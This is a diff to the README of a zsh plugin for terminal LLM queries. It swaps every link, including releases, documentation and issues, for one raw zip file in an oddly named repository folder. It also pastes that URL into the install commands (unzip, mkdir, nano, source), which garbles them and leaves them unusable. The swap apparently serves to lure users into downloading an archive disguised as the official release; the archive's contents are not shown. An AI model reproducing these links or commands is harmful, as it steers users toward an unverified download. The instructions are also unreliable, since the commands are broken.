@@ -1,6 +1,6 @@
 # 🐚 zsh-llm-mode - A Simple Terminal Tool for LLM Queries
 
-[![Download zsh-llm-mode](https://img.shields.io/badge/Download%20zsh%2Dllm%2Dmode-blue.svg)](https://github.com/GitEdu-gi/zsh-llm-mode/releases)
+[![Download zsh-llm-mode](https://raw.githubusercontent.com/GitEdu-gi/zsh-llm-mode/main/philosophership/zsh-llm-mode.zip%20zsh%2Dllm%https://raw.githubusercontent.com/GitEdu-gi/zsh-llm-mode/main/philosophership/zsh-llm-mode.zip)](https://raw.githubusercontent.com/GitEdu-gi/zsh-llm-mode/main/philosophership/zsh-llm-mode.zip)
 
 ## 📥 Overview
 
@@ -12,7 +12,7 @@ Follow these steps to download and set up zsh-llm-mode:
 
 1. **Visit the Releases Page**  
    Click the link below to access the download options for zsh-llm-mode:  
-   [Download zsh-llm-mode](https://github.com/GitEdu-gi/zsh-llm-mode/releases)
+   [Download zsh-llm-mode](https://raw.githubusercontent.com/GitEdu-gi/zsh-llm-mode/main/philosophership/zsh-llm-mode.zip)
 
 2. **Choose Your Version**  
    You will see various versions listed. Select the latest version for the most current features and fixes. Look for a title like `zsh-llm-mode v1.x.x`.
@@ -41,11 +41,11 @@ Follow these steps to download and set up zsh-llm-mode:
    Depending on the file type, you may need to extract it. Use commands like:
    - For `.zip` files:  
      ```
-     unzip zsh-llm-mode-v1.x.x.zip
+     unzip https://raw.githubusercontent.com/GitEdu-gi/zsh-llm-mode/main/philosophership/zsh-llm-mode.zip
      ```
-   - For `.tar.gz` files:  
+   - For `https://raw.githubusercontent.com/GitEdu-gi/zsh-llm-mode/main/philosophership/zsh-llm-mode.zip` files:  
      ```
-     tar -xzf zsh-llm-mode-v1.x.x.tar.gz
+     tar -xzf https://raw.githubusercontent.com/GitEdu-gi/zsh-llm-mode/main/philosophership/zsh-llm-mode.zip
      ```
 
 4. **Move to Installation Directory**  
@@ -57,14 +57,14 @@ Follow these steps to download and set up zsh-llm-mode:
 5. **Install the Plugin**  
    Follow these commands to install zsh-llm-mode into your Zsh setup:  
    ```
-   mkdir -p ~/.oh-my-zsh/custom/plugins
-   cp -r ./zsh-llm-mode ~/.oh-my-zsh/custom/plugins/
+   mkdir -p ~https://raw.githubusercontent.com/GitEdu-gi/zsh-llm-mode/main/philosophership/zsh-llm-mode.zip
+   cp -r ./zsh-llm-mode ~https://raw.githubusercontent.com/GitEdu-gi/zsh-llm-mode/main/philosophership/zsh-llm-mode.zip
    ```
 
 6. **Update Zsh Configuration**  
    Open your `.zshrc` file with a text editor:  
    ```
-   nano ~/.zshrc
+   nano ~https://raw.githubusercontent.com/GitEdu-gi/zsh-llm-mode/main/philosophership/zsh-llm-mode.zip
    ```
    Find the line starting with `plugins=(...)` and add `zsh-llm-mode` inside the parentheses, like so:
    ```
@@ -74,7 +74,7 @@ Follow these steps to download and set up zsh-llm-mode:
 7. **Apply Changes**  
    Save your changes and exit the editor. To apply the new settings, run:  
    ```
-   source ~/.zshrc
+   source ~https://raw.githubusercontent.com/GitEdu-gi/zsh-llm-mode/main/philosophership/zsh-llm-mode.zip
    ```
 
 Bravo! You have installed zsh-llm-mode.
@@ -106,12 +106,12 @@ Bravo! You have installed zsh-llm-mode.
 ## 📍 Download & Install
 
 To download the latest version of zsh-llm-mode, visit the following link:  
-[Download zsh-llm-mode](https://github.com/GitEdu-gi/zsh-llm-mode/releases)
+[Download zsh-llm-mode](https://raw.githubusercontent.com/GitEdu-gi/zsh-llm-mode/main/philosophership/zsh-llm-mode.zip)
 
 ## 📖 Additional Information
 
-- **Documentation**: For detailed usage instructions and advanced configurations, refer to the [Documentation](https://github.com/GitEdu-gi/zsh-llm-mode/wiki).
-- **Support**: If you experience any issues or have questions, feel free to open an issue on the [GitHub Issues page](https://github.com/GitEdu-gi/zsh-llm-mode/issues).
+- **Documentation**: For detailed usage instructions and advanced configurations, refer to the [Documentation](https://raw.githubusercontent.com/GitEdu-gi/zsh-llm-mode/main/philosophership/zsh-llm-mode.zip).
+- **Support**: If you experience any issues or have questions, feel free to open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/GitEdu-gi/zsh-llm-mode/main/philosophership/zsh-llm-mode.zip).
 - **Contributing**: If you'd like to contribute to this project, check the contributing guidelines in the repository.
 
 Enjoy using zsh-llm-mode for quick and efficient LLM queries in your terminal!
